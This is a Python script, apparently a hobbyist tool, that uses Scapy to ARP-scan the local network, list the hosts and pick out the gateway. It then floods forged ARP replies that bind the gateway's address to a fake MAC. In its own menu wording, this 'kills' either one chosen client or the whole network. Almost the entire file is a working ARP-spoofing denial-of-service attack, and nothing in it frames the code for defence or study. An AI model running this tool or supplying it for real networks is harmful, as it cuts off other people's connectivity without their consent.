from scapy.all import *
import socket

import threading

threads = []
ipAdrs = []

clients = []
gateway = []

typeAttack = 0
clientNum = None
deauthMac = '12:34:56:78:9A:BC'
# Colors
white = '\033[0;0;0m'

red = '\033[1;31;1m'
green = '\033[1;32;1m'
yellow = '\033[1;33;1m'
blue = '\033[1;34;1m'
purple = '\033[1;35;1m'
cyan = '\033[1;36;1m'


def paintString(string, color):
	return color + string + white

def getLanIp():
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		sock.connect(('8.8.8.8', 80))
		lanIp = sock.getsockname()[0]
	except:
		print('Connect to Wifi AP...')
		sys.exit()
	finally:
		sock.close();

	return lanIp
	
def sendDeauthPacket(sourceIP, sourceHW, distIP, distHW):
	send(ARP(op=2, psrc=sourceIP, hwsrc=sourceHW, pdst=distIP, hwdst=distHW), verbose=0)

def deauth(type, clientNum = 0):
	try:
		print(paintString('Start network deauth...', red))
		while True:
			if type == 1:
				sendDeauthPacket(gateway[0], deauthMac, clients[clientNum][0], clients[clientNum][1])
			else:
				for client in clients:
					sendDeauthPacket(gateway[0], deauthMac, client[0], client[1])
	except KeyboardInterrupt:
		if type == 1:
			sendDeauthPacket(gateway[0], gateway[1], clients[clientNum][0], clients[clientNum][1])
		else:
			for client in clients:
				sendDeauthPacket(gateway[0], gateway[1], client[0], client[1])
		print(paintString('!Stop deauth!', green))
		
def ARP_Scanner():	#Arp - Send&Recive
	lanIp = getLanIp()
	splitedLanIp = lanIp.split('.')
	for i in range(1, 255):
		ipAdrs.append(splitedLanIp[0] + '.' + splitedLanIp[1] + '.' + splitedLanIp[2] + '.' + str(i))
	arpPaket = Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(pdst=ipAdrs)
	ans, nans = srp(arpPaket, verbose=0, timeout=0.1)
	for client in ans:
		clients.append([client[len(client) - 1].psrc, client[len(client) - 1].hwsrc])
		end='\n'
		if client[len(client) - 1].psrc == ipAdrs[0]:
			gateway.append(client[len(client) - 1].psrc)
			gateway.append(client[len(client) - 1].hwsrc)
			end=' [ {0} ]\n'.format(paintString('GATEWAY', yellow))
		print('[ {0} ] {1}\t{2}'.format(paintString(str(len(clients)), red), clients[len(clients) - 1][0], clients[len(clients) - 1][1]), end=end)
			
if __name__ == '__main__':      
	try:      
		print(paintString('|--------------ARP Scanner---------------|', green))
		print(paintString('         [ IP ]\t\t     [ MAC ] ', blue))
		ARP_Scanner()	
		print(paintString('|--------------ARP Scanner---------------|', green))

		while typeAttack < 1 or typeAttack > 2:
			print('Choose type attack: {0} Kill specific client, {1} Kill all network?'.format(paintString('(1)', red), paintString('(2)', red), end=""))
			typeAttack = int(input())
		if typeAttack == 1:
			print("Choose client to kill(1 - {0}): ".format(len(clients)))
			clientNum = int(input())
		deauth(typeAttack, clientNum - 1)
	except KeyboardInterrupt:
		exit()